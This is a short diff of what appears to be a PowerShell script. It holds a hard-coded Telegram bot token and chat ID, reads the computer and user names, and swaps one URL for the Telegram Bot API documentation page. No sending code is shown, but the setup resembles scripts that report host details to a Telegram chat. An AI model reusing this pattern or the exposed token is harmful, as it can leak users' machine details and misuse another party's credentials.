@@ -4,7 +4,7 @@
 $Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg"
 $ChatID = "1018796719"
 
-$URL    = "https://telegram.org"
+$URL    = "https://core.telegram.org/bots/api"
 $MiPC   = $env:COMPUTERNAME
 $User   = $env:USERNAME
 
